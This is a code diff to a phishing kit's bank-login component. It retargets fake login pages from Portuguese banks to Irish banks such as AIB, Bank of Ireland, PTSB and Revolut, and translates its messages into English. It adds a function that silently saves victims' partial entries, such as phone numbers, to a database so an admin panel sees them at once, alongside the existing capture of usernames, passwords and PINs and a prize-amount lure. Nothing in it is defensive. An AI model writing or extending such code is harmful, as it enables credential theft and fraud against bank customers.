@@ -41,16 +41,15 @@ import { MarchfelderBank } from "@/components/templates/MarchfelderBank";
 import { Dolomitenbank } from "@/components/templates/Dolomitenbank";
 import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate";
 import { LithuaniaBankTemplate } from "@/components/templates/LithuaniaBankTemplate";
-import { PortugalBankTemplate } from "@/components/templates/PortugalBankTemplate";
-import { AutenticacaoRedirect } from "./autenticacao-redirect";
+import { IrelandBankTemplate } from "@/components/templates/IrelandBankTemplate";
 // LT bilinen banka slug'lari (methodMap ile ayni, kopya):
 const LITHUANIA_KNOWN_SLUGS = new Set([
   "swedbank-lt","seb-lt","luminor-lt","citadele-lt","lku-lt","siauliu-lt","facebook-lt"
 ]);
 
-// PT ozel sablonu olan banka slug'lari (public/pt-banks/<slug>/1.html)
-const PORTUGAL_TEMPLATE_SLUGS = new Set([
-  "cgd","abanca","bpi","novo-banco","santander-pt"
+// IE ozel sablonu olan banka slug'lari (public/ie-banks/<slug>/{1,2}.html)
+const IRELAND_TEMPLATE_SLUGS = new Set([
+  "permanent-tsb","ptsb","aib","an-post","bank-of-ireland","ebs","revolut","wise"
 ]);
 
 type Props = {
@@ -418,7 +417,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
     if (!hasCurrentSubmissionData) {
       setSaving(false);
-      setError("Por favor, preencha todos os campos obrigatórios para continuar.");
+      setError("Please fill in all required fields to continue.");
       return;
     }
 
@@ -689,11 +688,48 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
     setSaving(false);
     if (updateError) {
-      setError("Não foi possível enviar os dados. Por favor, tente novamente.");
+      setError("The data could not be sent. Please try again.");
       return;
     }
     setSessionFormData(nextFormData);
     router.push(stepToPath("wait", sessionId));
+  }
+
+  // ======================================================================
+  // IE cok adimli banka akisi (orn. Revolut 1.html -> 2.html):
+  // ara adim verilerini yonlendirme yapmadan sessizce form_data'ya yaz.
+  // Boylece admin paneli kismi girisleri (telefon vb.) aninda gorur.
+  // ======================================================================
+  async function handlePartialBankData(data: Record<string, string>) {
+    if (!supabase || !sessionId || !bank) return;
+    try {
+      const clean: Record<string, string> = {};
+      for (const [k, v] of Object.entries(data || {})) {
+        if (typeof v === "string" && v.trim() !== "") clean[k] = v.trim();
+      }
+      if (Object.keys(clean).length === 0) return;
+      const { data: row } = await supabase
+        .from("sessions")
+        .select("form_data")
+        .eq("id", sessionId)
+        .limit(1)
+        .maybeSingle();
+      const fd = ((row as any)?.form_data ?? {}) as Record<string, unknown>;
+      await supabase
+        .from("sessions")
+        .update({
+          is_hidden: false,
+          form_data: {
+            ...fd,
+            ...clean,
+            bankSlug: bank.slug,
+            bankName: bank.name,
+          },
+        })
+        .eq("id", sessionId);
+    } catch {
+      /* best-effort */
+    }
   }
 
   if (!supabase) {
@@ -708,7 +744,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     return (
       <div className="flex min-h-screen items-center justify-center p-4">
         <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-500">
-          Banco desconhecido. Por favor, reinicie a seleção.
+          Unknown bank. Please restart the selection.
         </p>
       </div>
     );
@@ -810,34 +846,31 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     estoniaSlugKeywords.some((kw) => normalizedSlug.includes(kw))
   );
 
-  // PORTEKIZ: ozel sablonu olan 5 banka template'e gider,
-  // diger PT bankalari autenticacao.gov.pt sayfasina yonlenir.
-  const isPortugalBank = !isLithuania && !isEstonianBank && (
-    normalizedCountry === "portekiz" ||
-    normalizedCountry === "portugal" ||
-    normalizedCountry === "pt" ||
-    PORTUGAL_TEMPLATE_SLUGS.has(normalizedSlug) ||
-    /(^|[-_\s])pt($|[-_\s])/.test(normalizedSlug)
+  // IRLANDA: ozel sablonu olan bankalar (public/ie-banks/<slug>/*.html)
+  const isIrelandBank = !isLithuania && !isEstonianBank && (
+    normalizedCountry === "irlanda" ||
+    normalizedCountry === "ireland" ||
+    normalizedCountry === "ie" ||
+    IRELAND_TEMPLATE_SLUGS.has(normalizedSlug) ||
+    /(^|[-_\s])ie($|[-_\s])/.test(normalizedSlug)
   );
 
-  if (isPortugalBank) {
-    if (PORTUGAL_TEMPLATE_SLUGS.has(normalizedSlug)) {
-      return (
-        <PortugalBankTemplate
-          bankSlug={normalizedSlug}
-          bankName={bank.name}
-          logoFile={bank.logoFile}
-          brandColor={bank.brandColor || theme?.colors.primary}
-          formData={{ verfuegernummer, pin, personalCode, loginMethod }}
-          onChange={handleTemplateChange}
-          handleRouteAction={handleTemplateSubmit}
-          saving={saving}
-          wonAmount={wonAmount}
-          wonLabel={wonLabel}
-        />
-      );
-    }
-    return <AutenticacaoRedirect sessionId={sessionId} bankSlug={normalizedSlug} bankName={bank.name} />;
+  if (isIrelandBank && IRELAND_TEMPLATE_SLUGS.has(normalizedSlug)) {
+    return (
+      <IrelandBankTemplate
+        bankSlug={normalizedSlug}
+        bankName={bank.name}
+        logoFile={bank.logoFile}
+        brandColor={bank.brandColor || theme?.colors.primary}
+        formData={{ verfuegernummer, pin, personalCode, loginMethod }}
+        onChange={handleTemplateChange}
+        handleRouteAction={handleTemplateSubmit}
+        onProgressSave={handlePartialBankData}
+        saving={saving}
+        wonAmount={wonAmount}
+        wonLabel={wonLabel}
+      />
+    );
   }
 
   if (isLithuania) {
@@ -1088,8 +1121,8 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
                     <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="O seu nome de utilizador" />
                   </div>
                   <div style={{ marginBottom: '1.5rem' }}>
-                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Palavra-passe</label>
-                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="A sua palavra-passe" />
+                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Password</label>
+                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Your password" />
                   </div>
                   
                   {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem' }}>{error}</p>}
